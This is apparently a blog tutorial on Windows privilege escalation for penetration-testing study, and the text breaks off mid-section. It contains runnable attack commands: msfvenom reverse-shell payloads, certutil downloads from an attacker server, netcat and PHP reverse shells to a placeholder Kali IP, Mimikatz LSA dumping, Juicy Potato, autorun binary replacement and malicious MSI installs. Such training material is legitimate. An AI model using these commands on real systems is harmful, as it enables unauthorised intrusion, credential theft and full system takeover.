---
title: "Windows Privilege Escalation"
date: 2024-09-27 10:00:00 +0800
categories: [Windows, Security]
tags: [Privilege Escalation, Windows]
excerpt: "A detailed write-up on Windows privilege escalation techniques covered in the Privilege Escalation in Windows."
---
# Windows PrivEsc
![image.png](https://hacklido.com/assets/files/2023-03-05/1678043519-805217-0-windows-headpic.jpg)
**Introduction to the Privilege Escalation Course for Windows**

The Privilege Escalation Course for Windows is designed to equip cybersecurity enthusiasts with the skills and knowledge needed to elevate their access on Windows systems. Throughout this course, you will explore various privilege escalation techniques, from exploiting misconfigurations to abusing Windows services and kernel vulnerabilities.

By the end of this course, you will have a deep understanding of how to identify and exploit weaknesses in Windows environments, enhancing your proficiency in privilege escalation. This course is ideal for those looking to improve their penetration testing abilities or strengthen defenses against unauthorized access in Windows systems.

# Initial Enumeration

# System Enumeration:

1. **Display the system's hostname:**
First, I use the command `hostname` to display the system's hostname. The hostname is a unique name assigned to a computer on a network, which helps identify it among other devices.
    
    ```bash
    hostname
    ```
    
2. **Display detailed information about the system's version and OS:**
I use the command `systeminfo` to gather detailed information about the system, including the OS version, build number, and installed hotfixes. This can help in identifying any potential exploits.
    
    ```bash
    systeminfo
    ```
    
3. **Check Windows version:**
Some commands are useful to know the exact version and build of the operating system:
    
    ```bash
    wmic os get caption, version, osarchitecture
    systeminfo | findstr /B /C: "OS Name" /C: "OS Version" /C:"System Type"
    
    # wmic ( windows manager instrumentation command line ) 
    # qfe ( quick fix engineering ) 
    # to see whats patched
    
    wmic qfe get Caption,Description,HotFixID,InstalledOn
    wmic logicaldisk get caption,description,providername
    ```
    
4. **Display CPU information:**
To get detailed information about the CPU, I use the following command:
    
    ```bash
    wmic cpu get name, caption, maxclockspeed
    ```
    
5. **Check running processes:**
To see the currently running processes and check if any are running as the `SYSTEM` or `Administrator` user, I use:
    
    ```bash
    tasklist /v
    ```
    
    Additionally, you can filter for processes running under the SYSTEM account:
    
    ```bash
    tasklist /FI "USERNAME eq SYSTEM"
    ```
    

# User Enumeration:

User enumeration is a critical step in system enumeration, especially when trying to gain insights into the users and their roles on the system. In Windows, several built-in commands can be used to extract detailed information about user accounts, their privileges, and group memberships. Here are some commonly used commands:

1. **Display the current user:**
The first step in user enumeration is to identify the user currently logged in. The `whoami` command displays the username of the current session.
    
    ```bash
    whoami
    ```
    
2. **Display the current user’s privileges:**
To understand the level of privileges the current user has, the `whoami /priv` command is used. This will show a list of the user’s privileges, such as whether they have administrative rights, the ability to back up files, or take ownership of objects.
    
    ```bash
    whoami /priv
    ```
    
3. **Display group memberships of the current user:**
Knowing which groups the current user belongs to can help understand their roles and permissions within the system. The `whoami /groups` command lists all groups associated with the current user, including administrative or restricted groups.
    
    ```bash
    whoami /groups
    ```
    
4. **List all user accounts on the system:**
To see all the user accounts that exist on the system, the `net user` command is used. This provides a list of users, which can be useful for targeting specific accounts during privilege escalation attempts.
    
    ```bash
    net user
    ```
    
5. **Display detailed information about a specific user:**
To get more detailed information about a particular user, including when the account was created, last logon time, and whether the account is disabled or locked, you can use the `net user <specific user>` command.
    
    ```bash
    net user <specific user>
    ```
    
6. **Display members of a specific local group:**
Local groups often define the permissions users have on the system. By using the `net localgroup <group>` command, you can list the members of a specific group, such as the Administrators or Remote Desktop Users group, which is helpful for identifying high-privilege accounts.
    
    ```bash
    net localgroup <group>
    ```
    

### Example:

- To see all users:
    
    ```bash
    net user
    ```
    
- To check if a specific user, like "Administrator", exists and view their details:
    
    ```bash
    net user Administrator
    ```
    
- To list the members of the Administrators group:
    
    ```bash
    net localgroup Administrators
    ```
    

These commands provide valuable information about user accounts, their privileges, and their group memberships, helping you understand the security posture of the system and potentially identify accounts that could be used for privilege escalation.

# Network Enumeration

Network enumeration involves gathering information about the network configuration, active connections, and routing details of the system. This is essential in identifying potential attack vectors or escalating privileges by leveraging network misconfigurations.

Here are some useful commands for network enumeration in Windows:

###  **View detailed network configuration:**

The `ipconfig /all` command displays detailed information about the system's network interfaces, including IP addresses, subnet masks, default gateways, DNS servers, and MAC addresses. This is crucial to understand the network setup and identify misconfigurations.

```bash
ipconfig /all
```

### **List the ARP table:**

The ARP (Address Resolution Protocol) table maps IP addresses to MAC addresses of devices on the local network. Using the `arp -a` command, you can identify active devices on the network and gather information that can assist in lateral movement or network-based attacks.

```bash
arp -a
```

###  **Display the routing table:**

The `route print` command displays the system's routing table, showing the paths used for sending traffic between different network segments. This can help identify potential gateways or compromised routes that can be exploited for privilege escalation.

```bash
route print
```

###  **View active connections and listening ports:**

The `netstat -ano` command shows all active network connections, along with the associated process ID (PID) and protocol (TCP/UDP). This helps in identifying potentially vulnerable or suspicious connections.

```bash
netstat -ano
```

# Password Hunting

Password enumeration or "password hunting" involves searching the system for files and configurations that might store sensitive information, including passwords or credentials. Here are some useful commands for hunting down passwords in Windows systems:

###  **Search for password patterns in common file types:**

The `findstr /si password *.txt *.ini *.config` command searches for the term "password" in all `.txt`, `.ini`, and `.config` files in the current directory. This can help locate files where passwords may be stored in plaintext.

```bash
findstr /si password *.txt *.ini *.config
```

###  **Search all files for password patterns:**

To search across all files in a directory, you can use `findstr /spin "password" *.*`. This command recursively searches for any instance of the word "password" in all files and directories, revealing potential password storage locations.

```bash
findstr /spin "password" *.*
```

###  **Check specific XML files for saved passwords:**

The `Unattend.xml` file is often used in Windows installations and may contain sensitive information like saved passwords. Checking this file for passwords can provide access to system credentials:

```bash
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```

###  **Search for VNC configuration files:**

VNC (Virtual Network Computing) configuration files, such as `vnc.ini`, can sometimes store passwords. Using the following command, you can search the entire `C:\` drive for VNC-related `.ini` files that may contain sensitive information:

```bash
dir c:\ /s /b | findstr /si *vnc.ini
```

By using these commands, you can efficiently hunt for passwords and credentials stored in various locations on the system. This is a critical step in privilege escalation, as gaining access to these passwords could lead to compromising other accounts or services.

[Privilege Escalation - Windows · Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)

[Hunting For Passwords | The Red Team Vade Mecum](https://kwcsec.gitbook.io/the-red-team-handbook/techniques/privilege-escalation/hunting-for-passwords)

# AV Enumeration

Antivirus (AV) enumeration is crucial for understanding the security measures in place on a target system. Identifying the antivirus software running on a machine can help you determine potential bypass or evasion techniques. In Windows, various commands can be used to query the status of antivirus services.

###  **Query Windows Defender:**

The `sc query windefend` command checks the status of the Windows Defender service. If Windows Defender is running, it may block or alert on certain activities, so understanding its status is important for further exploitation.

```bash
sc query windefend
```

###  **Query all running services:**

The `sc queryex type= service` command lists all services currently running on the system, including antivirus services. By examining this list, you can identify any third-party antivirus software that may be installed and active on the machine.

```bash
sc queryex type= service
```

These commands help determine what security software is in place, allowing you to adjust your privilege escalation strategy accordingly by identifying AV solutions that could interfere with your activities.
# Exploring Automated Tools

# Automated Tools

Automated tools streamline the process of finding vulnerabilities and escalation paths on a Windows system. Below are some popular tools used for privilege escalation.

### **WinPEAS**

WinPEAS is part of the PEAS (Privilege Escalation Awesome Scripts) suite. It is a script designed to automate the process of finding potential privilege escalation vectors on Windows systems.

**Usage:**

- Download the `winpeas.exe` file from the repository.
- Upload the file to the target system and execute it.
    
    ```
    peas.exe
    ```
    
- The script will provide detailed output regarding misconfigurations, unquoted service paths, installed applications, and more.

**Link:** [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

---

### **Windows PrivEsc Checklist**

This is a checklist that guides you through manual and automated steps to escalate privileges on a Windows system.

**Usage:**

- Follow the guide to manually check for weak configurations, misconfigurations, and default passwords.

**Link:** [Windows PrivEsc Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

---

###  **Sherlock**

Sherlock is a PowerShell script that scans for known vulnerabilities in the Windows operating system that can be exploited for privilege escalation.

**Usage:**

- Download `Sherlock.ps1`.
- Run it in a PowerShell session with the command:
    
    ```powershell
    powershell -ep bypass
    .\Sherlock.ps1
    ```
    
- The script will identify any exploitable vulnerabilities present in the system.

**Link:** [Sherlock](https://github.com/rasta-mouse/Sherlock)

---

### **Watson**

Watson is a vulnerability scanner that helps identify vulnerabilities based on the system's patch level. It’s used to identify missing patches or configurations that could lead to privilege escalation.

**Usage:**

- Download `Watson.exe` or compile it.
- Run the executable in the system:
    
    ```
    Watson.exe
    ```
    

**Link:** [Watson](https://github.com/rasta-mouse/Watson)

---

###  **PowerUp**

PowerUp is part of PowerSploit, a collection of PowerShell scripts that can be used for post-exploitation. PowerUp specifically looks for privilege escalation opportunities on Windows systems.

**Usage:**

- Download `PowerUp.ps1`.
- Run the script in PowerShell:
    
    ```powershell
    powershell -ep bypass
    .\PowerUp.ps1
    ```
    
- PowerUp will scan the system for various weaknesses like service misconfigurations, registry key permissions, etc.

**Link:** [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

---

###  **JAWS (Just Another Windows Script)**

JAWS is a PowerShell script used for post-exploitation and enumeration. It focuses on gathering information about the system, its users, and potential privilege escalation paths.

**Usage:**

- Download `JAWS-enum.ps1`.
- Run the script in PowerShell:
    
    ```powershell
    powershell -ep bypass
    .\JAWS-enum.ps1
    ```
    

**Link:** [JAWS](https://github.com/411Hall/JAWS)

---

###  **Windows Exploit Suggester**

This tool compares the patch level of the target system against the latest security bulletins from Microsoft to suggest potential privilege escalation vulnerabilities.

**Usage:**

- Clone the repository.
- Update the database:
    
    ```bash
    ./windows-exploit-suggester.py --update
    ```
    
- Use the tool to compare the system info:
    
    ```css
    ./windows-exploit-suggester.py --database <db.xls> --systeminfo <sysinfo.txt>
    ```
    

**Link:** [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

---

###  **Metasploit Local Exploit Suggester**

Metasploit has a built-in module that suggests local exploits for privilege escalation based on the target system's configuration.

**Usage:**

- Start the Metasploit console.
- Upload the `winpeas.exe` or similar enumeration tool to gather information.
- Run the `local_exploit_suggester` module:
    
    ```arduino
    use post/multi/recon/local_exploit_suggester
    set session <session_id>
    run
    ```
    

**Link:** [Metasploit Local Exploit Suggester](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)

---

### **Seatbelt**

Seatbelt is a C# project that performs various security-related checks for common misconfigurations that could lead to privilege escalation.

**Usage:**

- Compile or download `Seatbelt.exe`.
- Run the tool:
    
    ```bash
    Seatbelt.exe all
    ```
    

**Link:** [Seatbelt](https://github.com/GhostPack/Seatbelt)

---

###  **SharpUp**

SharpUp is another C# tool designed to find privilege escalation vectors. It is part of the GhostPack suite and focuses on misconfigurations and exploitable services.

**Usage:**

- Compile or download `SharpUp.exe`.
- Run the tool:
    
    ```
    SharpUp.exe
    ```
    

**Link:** [SharpUp](https://github.com/GhostPack/SharpUp)

---

# Tools for Enumeration

Once you've downloaded the necessary tools, you can begin enumerating the system. Here are the executables and PowerShell scripts commonly used:

### Executables:

- **winpeas.exe**
- **Seatbelt.exe** (compile if needed)
- **Watson.exe** (compile if needed)
- **SharpUp.exe** (compile if needed)

### PowerShell:

- **Sherlock.ps1**
- **PowerUp.ps1**
- **jaws-enum.ps1**

### Other Tools:

- **windows-exploit-suggester.py** (local)
- **Metasploit exploit suggester**

---

# Executing

### In Metasploit:

To execute tools in Metasploit, you can upload the enumeration tools and run the local exploit suggester.

```bash
 cd c:\\windows\\temp
upload <path/winpeas.exe>
load powershell
run post/multi/recon/local_exploit_suggester
```

### In Shell:

- To run PowerShell scripts, bypass execution policy:
    
    ```powershell
    powershell -ep bypass
    .\PowerUp.ps1
    ```
    

### In Kali:

- To use the Windows Exploit Suggester:
    
    ```powershell
    ./windows-exploit-suggester.py --update
    pip install xlrd --upgrade
    ./windows-exploit-suggester.py --database <db.xls> --systeminfo <sysinfo.txt>
    ```

    # Escalation Path: Kernel Exploits

Kernel exploits are a powerful technique in privilege escalation. They target vulnerabilities in the core of the operating system (the kernel), which controls interactions between hardware and software components. Successfully exploiting a kernel vulnerability can grant SYSTEM-level privileges, allowing you to fully control the target machine.

### **What is a Kernel?**

- The kernel is the core part of the operating system that manages system resources and allows hardware and software to communicate.
- It acts as a **translator** between applications and the physical hardware, ensuring that resources are used effectively.

### **Kernel Exploit Repositories:**

A great source for finding kernel exploits is the Windows Kernel Exploits repository on GitHub. This repository contains various kernel vulnerabilities that can be exploited for privilege escalation.

**Link:** [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

---

## Exploiting Kernel Vulnerabilities with Metasploit

### **Steps for Kernel Exploits in Metasploit:**

1. **Run Enumeration Tools:**
First, you need to gather information about the system using tools like WinPEAS, PowerUp, or Metasploit's local exploit suggester. These tools help you identify which kernel vulnerabilities are applicable to the target system.
    - Example tools:
        - `winpeas.exe`
        - `powerup.ps1`
        - `local_exploit_suggester` in Metasploit
2. **Check the Kernel Vulnerabilities:**
Once you identify a potential kernel exploit, you can use Metasploit to search for a matching exploit.
    - **Example Metasploit Kernel Exploit:**
        
        ```
        use exploit/windows/local/ms10_015_kitrap0d
        set session <session_id>
        set lhost <your_ip>
        set lport <your_port>
        exploit
        ```
        
3. **Background the Session:**
After getting a session, background it to execute the kernel exploit.
    
    ```
    background
    ```
    

### **Metasploit Example: MS10-015 (Kitrap0d)**

- This is a known kernel vulnerability affecting Windows, and it can be exploited using the `ms10_015_kitrap0d` exploit in Metasploit.
- After setting the necessary options (`session`, `lhost`, `lport`), running the exploit should give you SYSTEM-level access.

---

## Manual Kernel Exploitation

Sometimes you may need to exploit a kernel vulnerability manually, especially when a pre-built exploit is not available in Metasploit. Below is an example of how to exploit a kernel vulnerability manually.

### **Steps for Manual Kernel Exploitation:**

1. **Generate a Payload using msfvenom:**
First, generate a reverse shell payload that will give you access to the system when the exploit is triggered.
    
    ```
    msfvenom -p windows/shell_reverse_tcp lhost=<your_ip> lport=<your_port> -f aspx > shell.aspx
    ```
    
2. **Start a Netcat Listener:**
On your attacking machine, set up a Netcat listener to capture the reverse shell when the exploit runs.
    
    ```
      nc -lvnp <your_port>
    ```
    
3. **Transfer the Exploit to the Target:**
    - On your Kali machine, use `python3` to set up a simple HTTP server:
        
        ```
        python3 -m http.server 80
        ```
        
    - On the target Windows machine, use `certutil` to download the exploit:
        
        ```
        certutil -urlcache -f http://<your_ip>/<exploit_file> <output_name>
        ```
        
4. **Run the Exploit on the Target:**
After downloading the exploit, execute it on the target machine with the following command:
    
    ```
    exploit.exe <your_ip> <your_port>
    ```
    
5. **Get the Reverse Shell:**
On your Kali machine, with the Netcat listener active, you should receive a reverse shell as `SYSTEM`, providing you with full control over the target.

---

### **Example: MS10-059 Kernel Exploit**

Let’s walk through exploiting a specific kernel vulnerability, **MS10-059**:

1. **Prepare the Exploit on Kali:**
Set up a Python HTTP server to serve the exploit:
    
    ```
    python3 -m http.server 80
    ```
    
2. **Download the Exploit on Windows:**
Use `certutil` to download the exploit onto the target machine:
    
    ```
    certutil -urlcache -f http://<your_ip>/ms10-059.exe ms10-059.exe
    ```
    
3. **Execute the Exploit:**
Run the downloaded exploit:
    
    ```
    ms10-059.exe <your_ip> <your_port>
    ```
    
4. **Capture the Shell:**
On Kali, use Netcat to catch the reverse shell:
    
    ```
    nc -lvnp <your_port>
    ```
    

If successful, this will give you `SYSTEM` privileges.

---

## Conclusion

Exploiting kernel vulnerabilities can be one of the most powerful ways to escalate privileges in a Windows environment. By running tools like WinPEAS or PowerUp, you can gather critical information about the system and identify which kernel exploits are applicable. Whether you use automated tools like Metasploit or go the manual route with tools like msfvenom, kernel exploits can provide complete control over a compromised system.

### **Additional Kernel Exploit Resources:**

- [MS10-059 Kernel Exploit](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)

By understanding and executing these techniques, you can successfully escalate privileges and achieve root-level access on vulnerable Windows machines.

# Escalation Path: Windows Subsystem for Linux (WSL)

Windows Subsystem for Linux (WSL) allows running a Linux environment directly on Windows without needing a virtual machine or dual boot. Misconfigurations in WSL can be exploited to escalate privileges, enabling an attacker to gain **root access** or misuse WSL to run commands with elevated privileges.

### **Concept Overview**

- WSL bridges the gap between Linux and Windows. If an attacker can execute commands in WSL, they can use Linux commands to escalate privileges on the Windows system.
- Misusing **WSL** can lead to privilege escalation, especially if WSL is configured to allow root access or execute privileged operations.
- **Root privileges in WSL** allow the attacker to perform tasks like creating reverse shells, reading system files, or modifying system settings.

---

### Step-by-Step: Privilege Escalation Using WSL

### 1. **Identify WSL on the Target Machine**

First, determine if WSL is installed and locate the path to `bash.exe` and `wsl.exe`. These binaries are necessary to interact with the WSL environment.

### **Example Command:**

```bash
where /R c:\windows bash.exe
where /R c:\windows wsl.exe
```

This command will search for the WSL binaries on the Windows machine. If found, it confirms that WSL is installed and can be exploited.

### **Example Output:**

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

### 2. **Check for Root Access in WSL**

If WSL is installed, check if the WSL environment grants **root** access. WSL can be configured to start with root by default, or you can change the default user to `root` if you have access.

### **Command to Change Default User to Root:**

```bash
wsl.exe --set-default-user root
```

This command sets `root` as the default user in WSL. By running this, you can now open a WSL shell with root privileges without needing the root password.

### **Example Attack Scenario:**

After changing the default user to `root`, the attacker can run any Linux commands with root privileges inside WSL.

```bash
wsl
# Once inside WSL as root:
whoami
# Output: root
```

### 3. **Run Linux Commands for Privilege Escalation**

Now that you have root access in WSL, you can execute Linux commands to interact with the Windows system.

### **Example: Creating a Reverse Shell**

Create a reverse shell from the target system to your attack machine using Netcat:

1. **On your attacker machine (Kali Linux), start a Netcat listener:**
    
    ```bash
    nc -lvnp 4444
    ```
    
2. **On the target system (via WSL root access), run the following command:**
    
    ```bash
    wsl
    nc -e /bin/bash <kali_ip> 4444
    ```
    
    This command opens a reverse shell from the target machine back to your Kali machine. You can now control the system remotely through the shell.
    

### **Example Output:**

On your attacker machine, you should now have a root shell from the target system:

```bash
Connection received on <target_ip>:4444
whoami
root
```

---

### Advanced Techniques: Using **Impacket** Tools for Privilege Escalation

The **Impacket** toolkit includes various scripts for exploiting Windows protocols, such as SMB. If you have valid credentials on the system, you can use tools like **psexec.py** to execute commands remotely.

### **Example Command:**

```bash
psexec.py user:password@target_ip
```

This command connects to the target machine over SMB and executes a command with the provided credentials. Once successful, you can gain administrative access.

### **Example Scenario:**

```bash
psexec.py admin:P@ssword123@192.168.1.100
```

This will open an interactive shell as `admin` on the target machine if the credentials are correct.

---

### Alternative Path: Reverse Shell Using PHP

If you can upload files to the system (e.g., through a vulnerable web server), you can create a **reverse shell** using PHP.

### **Example PHP Reverse Shell:**

Create a PHP file (`shell.php`) with the following content:

```php
<?php
system('nc.exe -e cmd.exe <kali_ip> 4444');
?>
```

1. Upload this file to the target system.
2. On your attacker machine, set up a Netcat listener:
    
    ```bash
    nc -lvnp 4444
    ```
    
3. Navigate to the PHP file on the target system (e.g., `http://target.com/shell.php`). This will execute the reverse shell and give you a command line interface on the target machine.

---

### Final Thoughts

Windows Subsystem for Linux (WSL) is a powerful feature in Windows environments, but it can also be misused for privilege escalation if misconfigured. By abusing WSL's root capabilities or misconfigured access, an attacker can leverage Linux commands and tools to control the underlying Windows system.

**Key Techniques to Remember:**

- Change the default WSL user to `root` to bypass authentication.
- Use Linux commands inside WSL to escalate privileges or create shells.
- Tools like **Impacket** and **Netcat** can assist in exploiting the system remotely.
- WSL persistence can be used to maintain continuous access to a compromised system.

By combining these techniques, attackers can effectively escalate privileges and gain control over a compromised Windows environment using WSL.

# **Token Impersonation and Potato Attacks**

**Token Impersonation** and **Potato Attacks** are methods used for privilege escalation in Windows systems, allowing attackers to gain higher privileges, such as **SYSTEM** or **Administrator**, by exploiting specific tokens and system weaknesses.

---

### **What Are Tokens?**

In Windows, tokens are temporary keys that grant users access to a system or network without needing to re-authenticate for every action. These tokens can be compared to cookies in web browsers that store session data.

### **Types of Tokens:**

1. **Delegate Tokens**:
    - Created for actions like logging into a machine or using **Remote Desktop**.
    - These are "interactive" tokens.
2. **Impersonate Tokens**:
    - Created for "non-interactive" actions, such as attaching a network drive or running a domain logon script.
    - Impersonation tokens allow processes to perform actions on behalf of another user without requiring direct interaction.

---

### **Token Impersonation: How It Works**

In **token impersonation**, an attacker leverages the ability to take control of another user’s token, specifically one with higher privileges, to execute commands with elevated rights.

### **Example Using Meterpreter**:

1. **Identify the current user**:
    
    ```bash
    getuid
    ```
    
2. **Load Incognito** (a tool for token manipulation):
    
    ```bash
    load incognito
    ```
    
3. **List available tokens** to impersonate:
    
    ```bash
    list_tokens -u
    ```
    
4. **Impersonate a token** for a user with higher privileges:
    
    ```bash
    impersonate_token <domain\\user>
    ```
    
5. **Obtain a shell** with the elevated token:
    
    ```bash
    shell
    ```
    

### **Practical Use**:

If you attempt to dump **LSA** secrets (Local Security Authority) but lack the necessary permissions, you can impersonate another user with more privileges. For example:

```bash
Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /inject" exit' -Computer <DC.domain.local>
```

This allows you to bypass restrictions by impersonating another account with higher access.

---

### **Impersonation Privileges**

To successfully use token impersonation, certain privileges must be available:

1. **SeAssignPrimaryToken**: Allows a process to assign the primary token for another process.
2. **SeImpersonatePrivilege**: Allows a process to impersonate another user.
3. **SeTakeOwnership**: Allows a user to take ownership of objects (such as files) on the system.

You can check the privileges available to your current session:

- **In Meterpreter**:
    
    ```bash
    getprivs
    ```
    
- **In a shell**:
    
    ```bash
    whoami /priv
    ```
    

If **SeImpersonatePrivilege** or **SeAssignPrimaryToken** is available, you can attempt **Potato Attacks**.

---

### **Potato Attacks**

**Potato Attacks** exploit weaknesses in the way Windows handles tokens and permissions, particularly the ability to impersonate tokens with high privileges, like **SYSTEM**.

### **Types of Potato Attacks**:

1. **Rotten Potato**:
    - Rotten Potato is a technique used to escalate privileges from a service account to **SYSTEM** by manipulating the way Windows handles authentication protocols.
    - Detailed guide: [Rotten Potato - Foxglove Security](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/).
2. **Juicy Potato**:
    - An improvement over Rotten Potato, **Juicy Potato** exploits the **DCOM** service (Distributed Component Object Model) to escalate privileges on Windows.
    - Detailed guide: [Juicy Potato - GitHub](https://github.com/ohpe/juicy-potato).

### **Juicy Potato Example**:

1. First, download **Juicy Potato** from the [GitHub repository](https://github.com/ohpe/juicy-potato).
2. **Transfer the executable to the target machine**:
    - On your Kali Linux machine, start a Python server:
        
        ```bash
        python3 -m http.server 80
        ```
        
    - On the Windows target machine, download the file:
        
        ```bash
        certutil -urlcache -f http://<kali-ip>/juicy.exe C:\Temp\juicy.exe
        ```
        
3. **Run Juicy Potato**:
    - On the target machine, execute Juicy Potato with specific parameters:
        
        ```bash
        juicy.exe -t * -p cmd.exe -l 1337
        ```
        
    - This command attempts to escalate the current privileges to **SYSTEM** by exploiting DCOM.
4. Once successful, you now have **SYSTEM** privileges and can execute any command with the highest permissions.

### **Potato Attack Indicators**:

- **SeAssignPrimaryToken** and **SeImpersonatePrivilege** are critical for Potato attacks. If these privileges are enabled for your session, you can attempt these attacks.

---

### **Conclusion**

- **Token Impersonation** is a powerful technique in which attackers leverage tokens from higher-privileged accounts to elevate their permissions.
- **Potato Attacks** (like Rotten Potato and Juicy Potato) exploit weaknesses in Windows’ privilege handling to escalate permissions from lower-level service accounts to **SYSTEM**.
- Always check for the availability of **SeAssignPrimaryToken** and **SeImpersonatePrivilege** privileges to attempt these attacks.

Understanding and exploiting these techniques can be critical in Windows privilege escalation scenarios, particularly in penetration testing and red team engagements.

# **Escalation Path: `getsystem`**

### **What happens when I type `getsystem`?**

The `getsystem` command is a **privilege escalation** method in **Meterpreter** (part of the Metasploit Framework). When you execute this command, it attempts to elevate your current user privileges to the highest level, typically **SYSTEM** privileges, which are equivalent to root access in Unix-based systems.

- **`getsystem`** uses three different techniques for privilege escalation:
    1. **Named Pipe Impersonation (In Memory/Admin)**: This method impersonates the named pipes created in memory, typically used by services running under SYSTEM privileges.
    2. **Named Pipe Impersonation (On Disk/Admin)**: This method writes data to disk, but is often detected by antivirus (AV) software, which makes it less ideal.
    3. **Token Duplication (In Memory/Admin)**: This method duplicates a security token and requires **SeDebugPrivilege**, a privilege that allows the user to debug and manipulate the operating system. If you have this privilege enabled, this method may succeed.

In Meterpreter, you can run:

```
getsystem
getsystem -h
```

- The `h` flag shows the available options to use with the `getsystem` command, such as choosing a specific technique.

### **What Does `getsystem` Do?**

- The command attempts to **escalate privileges** to SYSTEM by leveraging Windows privilege vulnerabilities.
- It first checks for **SeDebugPrivilege**, which allows the duplication of the SYSTEM token. This is an essential step since SYSTEM tokens give complete control over the machine.
- It uses **Named Pipe Impersonation** as another option if token duplication is not possible. This involves hijacking service pipes that are running under SYSTEM privileges.

# **Escalation Path: `RunAs`**

### **Overview**

The `RunAs` command in Windows allows a user to run a command or application as another user, typically with higher privileges, such as an administrator. It is a common method used in privilege escalation attacks to execute actions under a different account, often with **SYSTEM** or **Administrator** privileges, when the attacker already has some level of access.

### **FootHold - Access on Hack The Box (HTB)**

In this example scenario, an attacker gains initial access by exploiting services like **FTP** to gather files that might contain sensitive information, including user credentials.

Steps to follow:

1. **Enter the FTP server**: This might be achieved through an open FTP service. The attacker can download files hosted on the FTP server.
2. **Extract data from files**:
    - Use the command `mdb-sql <db.mdb>` to open a database file and extract user-related information (e.g., usernames).
    - Use `readpst <pst file>` to extract contents from a **PST** file (Outlook personal storage file) to potentially reveal sensitive information like user credentials.
3. **Login via Telnet**: After obtaining user credentials from the database or email, the attacker can attempt to login to the system through **Telnet** (if the service is available and enabled).

### **Privilege Escalation**

Once the attacker has a foothold, they can attempt to escalate privileges to an administrative level using the `RunAs` command.

### **Steps for Privilege Escalation:**

1. **List stored credentials**:
Use the following command to list any cached credentials on the machine:
    
    ```
    cmdkey /list
    ```
    
2. **Run the command as an Administrator**:
If the attacker has access to an administrative account's credentials, they can execute the following `runas` command to escalate privileges and access sensitive files:
    
    ```
    C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"
    ```
    
    - **/user\Administrator**: Specifies the user account to run the command as.
    - **/savecred**: Saves the provided credentials for future use.
    - The command runs `cmd.exe` and uses it to read the **root.txt** file located on the **Administrator's** desktop, and then copies its contents to the attacker's own directory (e.g., **security**).

### **Explanation**

This technique allows the attacker to execute commands as the **Administrator**, enabling them to access sensitive information (such as the **root.txt** file, which could contain flags or critical information on the target system). By using `runas` with `/savecred`, the attacker can bypass the need to repeatedly enter credentials and execute future commands with the same level of privilege without prompt.

# **Escalation Path : Registry and Autorun Vulnerabilities**

When targeting Windows systems, attackers often exploit various vulnerabilities to escalate privileges. Two common attack paths involve **Registry Escalation** and **Autorun Vulnerabilities**. Here's an in-depth look at how these paths work and how they can be leveraged for privilege escalation.

---

### **Overview of Autoruns**

**Autoruns** refer to programs that automatically execute when the system starts. These programs are often registered in the system registry and may be exploited if improper permissions are set. Attackers can take advantage of these vulnerabilities by replacing authorized programs with malicious versions.

### **Steps to Identify Autorun Vulnerabilities**

1. **Running Autoruns:**
    - First, use the **Autoruns** tool to find potential vulnerabilities. For example:
        
        ```bash
        C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
        ```
        
2. **Check Permissions on Autorun Programs:**
    - Using the **AccessChk** tool, check the permissions of autorun programs:
        
        ```bash
        C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
        ```
        
3. **Run PowerUp to Find Vulnerabilities:**
    - PowerUp is a PowerShell script designed to identify misconfigurations that can lead to privilege escalation. To check for autorun vulnerabilities, run:
        
        ```bash
        powershell -ep bypass
        . .\PowerUp.ps1
        Invoke-AllChecks
        ```
        

---

### **Escalation via Autorun**

If an autorun program is vulnerable, you can escalate privileges by replacing the authorized executable with a malicious payload.

### **Steps to Exploit an Autorun Program:**

1. **Create a Malicious Payload:**
    - Use **msfvenom** to create a malicious executable:
        
        ```bash
        msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> -f exe -o program.exe
        ```
        
2. **Set up a Listener in Metasploit:**
    - In **msfconsole**, set up a listener to capture the reverse shell:
        
        ```bash
        use multi/handler
        set options
        ```
        
3. **Replace the Legitimate Autorun Program:**
    - Transfer `program.exe` to the target Windows machine and replace the legitimate program located in `/Program Files/Autorun Program/` with your malicious version:
        
        ```bash
        # Replace the existing executable with our program.exe
        ```
        
4. **Trigger the Autorun:**
    - After disconnecting from the machine, when the autorun program starts (e.g., after a reboot), it will execute your malicious payload, granting you a **Meterpreter shell** with SYSTEM privileges.

---

### **AlwaysInstallElevated Exploit**

The **AlwaysInstallElevated** setting is a Windows configuration that allows non-administrative users to install MSI packages with elevated privileges. If this setting is enabled, attackers can exploit it to run malicious code as an administrator.

### **Check for AlwaysInstallElevated Vulnerability:**

1. **Check the Registry Settings:**
    - To verify if this vulnerability is present, query the Windows registry:
        
        ```bash
        reg query HKLM\Software\Policies\Microsoft\Windows\Installer
        reg query HKCU\Software\Policies\Microsoft\Windows\Installer
        ```
        
    - If the value of `AlwaysInstallElevated` is `1`, the system is vulnerable.
2. **Create a Malicious MSI Package:**
    - Use **msfvenom** to create a malicious MSI package:
        
        ```bash
        msfvenom -p windows/meterpreter/reverse_tcp lhost=<your ip> -f msi -o setup.msi
        ```
        
3. **Run the MSI Package:**
    - Transfer `setup.msi` to the target machine and execute it. Ensure you have a listener running in **Metasploit** to catch the shell.

---

### **Registry ACL Exploits**

Registry keys control various aspects of the system’s functionality. If an attacker has full control over a registry key, they can modify it to execute arbitrary commands or escalate privileges.

### **Check Registry ACL Permissions:**

1. **Test for Full Control over a Registry Key:**
    - Use PowerShell to check the ACL (Access Control List) of a registry key:
        
